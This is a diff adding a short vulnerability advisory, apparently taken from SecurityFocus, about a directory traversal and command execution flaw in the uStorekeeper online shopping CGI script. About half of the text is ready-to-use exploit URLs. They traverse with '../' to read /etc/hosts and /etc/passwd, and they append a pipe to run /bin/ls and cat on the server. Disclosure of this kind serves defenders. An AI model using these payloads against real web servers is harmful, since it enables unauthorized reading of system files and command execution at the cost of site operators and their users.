@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/2536/info
+
+A vulnerability exists in versions of uStorekeeper Online Shopping System from Microburst Technologies.
+
+The script fails to properly validate user-supplied input, allowing remote users to submit URLs containing '/../' sequences and arbitrary filenames or commands, which will be executed or displayed with the privilege level of the webserver user.
+
+This permits the remote user to request files and execute commands from arbitrary locations on the host filesystem, outside the script's normal directory scope.
+
+http://www.example.com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../etc/hosts
+
+http://www.example.com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../bin/ls |
+
+http://www.example.com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd
+
+http://www.example .com/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../.
+./../../../../bin/cat%20ustorekeeper.pl| 
